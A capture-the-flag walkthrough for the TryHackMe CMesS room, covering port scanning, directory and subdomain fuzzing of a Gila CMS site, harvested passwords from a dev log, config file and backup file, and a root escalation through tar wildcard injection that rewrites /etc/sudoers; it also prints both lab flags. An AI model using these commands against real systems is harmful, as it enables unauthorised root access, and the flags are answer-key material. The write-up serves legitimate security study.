# CMesS

Can you root this Gila CMS box?

[CMesS](https://tryhackme.com/room/cmess)

## Topic's

- Network Enumeration
- Web Enumeration
- DNS Enumeration
- Stored Passwords & Keys
- SQL Enumeration
- Backup Poking
- Exploiting Crontab

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Flags

Please add MACHINE_IP cmess.thm to /etc/hosts
Please also note that this box does not require brute forcing!

```
kali@kali:~/CTFs/tryhackme/CMesS$ sudo nmap -sS -sC -sV -O 10.10.170.206
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 20:16 CEST
Nmap scan report for 10.10.170.206
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/11%OT=22%CT=1%CU=39063%PV=Y%DS=2%DC=I%G=Y%TM=5F834C
OS:0A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST
OS:11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.59 seconds
```

```
kali@kali:~/CTFs/tryhackme/CMesS$ searchsploit Gila CMS
---------------------------------------------------------------- ---------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ---------------------------------
Gila CMS 1.11.8 - 'query' SQL Injection                         | php/webapps/48590.py
Gila CMS 1.9.1 - Cross-Site Scripting                           | php/webapps/46557.txt
Gila CMS < 1.11.1 - Local File Inclusion                        | multiple/webapps/47407.txt
---------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```
kali@kali:~/CTFs/tryhackme/CMesS$ gobuster dir -u 10.10.170.206 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.170.206
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/11 20:18:55 Starting gobuster
===============================================================
/index (Status: 200)
/about (Status: 200)
/search (Status: 200)
/blog (Status: 200)
/login (Status: 200)
/01 (Status: 200)
/1 (Status: 200)
/category (Status: 200)
/themes (Status: 301)
/feed (Status: 200)
/0 (Status: 200)
/admin (Status: 200)
/assets (Status: 301)
/tag (Status: 200)
/author (Status: 200)
/Search (Status: 200)
/sites (Status: 301)
/About (Status: 200)
/log (Status: 301)
/Index (Status: 200)
/tags (Status: 200)
/1x1 (Status: 200)
/lib (Status: 301)
/src (Status: 301)
/api (Status: 200)
/001 (Status: 200)
/1pix (Status: 200)
/fm (Status: 200)
/tmp (Status: 301)
/1a (Status: 200)
/0001 (Status: 200)
/1x1transparent (Status: 200)
/INDEX (Status: 200)
/1px (Status: 200)
/1d (Status: 200)
/1_1 (Status: 200)
/Author (Status: 200)
/1pixel (Status: 200)
/0001-exploits (Status: 200)
/01_hello (Status: 200)
/1-1 (Status: 200)
Progress: 11952 / 220561 (5.42%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/11 20:28:45 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/CMesS$ wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 4997

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000019:   200        30 L     104 W    934 Ch      "dev"
```

[Development Log](http://dev.cmess.thm/)

```
Development Log
andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%
```

`andre@cmess.thm:KPFTN_f2yxe%`

```php
<?php

$GLOBALS['config'] = array (
  'db' =>
  array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
  'permissions' =>
  array (
    1 =>
    array (
      0 => 'admin',
      1 => 'admin_user',
      2 => 'admin_userrole',
    ),
  ),
  'packages' =>
  array (
    0 => 'blog',
  ),
  'base' => 'http://cmess.thm/gila/',
  'theme' => 'gila-blog',
  'title' => 'Gila CMS',
  'slogan' => 'An awesome website!',
  'default-controller' => 'blog',
  'timezone' => 'America/Mexico_City',
  'ssl' => '',
  'env' => 'pro',
  'check4updates' => 1,
  'language' => 'en',
  'admin_email' => 'andre@cmess.thm',
  'rewrite' => true,
);
```

```
www-data@cmess:/var/www$ mysql -u root -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 43362
Server version: 5.7.29-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| gila               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use gila;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_gila |
+----------------+
| option         |
| page           |
| post           |
| postcategory   |
| postmeta       |
| user           |
| usermeta       |
| userrole       |
| widget         |
+----------------+
9 rows in set (0.00 sec)

mysql> SELECT * FROM user;
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
| id | username | email           | pass                                                         | active | reset_code | created             | updated             |
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
|  1 | andre    | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa |      1 |            | 2020-02-06 18:20:34 | 2020-02-06 18:20:34 |
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
1 row in set (0.00 sec)

mysql>
```

```
www-data@cmess:/var/www$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
www-data@cmess:/var/www$ su -l andre
Password:
andre@cmess:~$ cd
andre@cmess:~$ ls
backup  user.txt
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
andre@cmess:~/backup$ echo 'echo "andre ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh privesc.sh"
andre@cmess:~/backup$ echo "" > --checkpoint=1
andre@cmess:~/backup$ sudo su
root@cmess:/home/andre/backup# cd /root/
root@cmess:~# ls -la
total 28
drwx------  2 root  root  4096 Feb 13  2020 .
drwxr-xr-x 22 root  root  4096 Feb  6  2020 ..
lrwxrwxrwx  1 root  root     9 Feb  6  2020 .bash_history -> /dev/null
-rw-r--r--  1 root  root  3106 Oct 22  2015 .bashrc
-rw-------  1 root  root   169 Feb  6  2020 .mysql_history
-rw-r--r--  1 root  root   148 Aug 17  2015 .profile
-rw-r--r--  1 andre andre   38 Feb  6  2020 root.txt
-rw-rw-rw-  1 root  root  4057 Feb 13  2020 .viminfo
root@cmess:~# cat root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
root@cmess:~#
```

1. Compromise this machine and obtain user.txt

`thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}`

2. Escalate your privileges and obtain root.txt

`thm{9f85b7fdeb2cf96985bf5761a93546a2}`
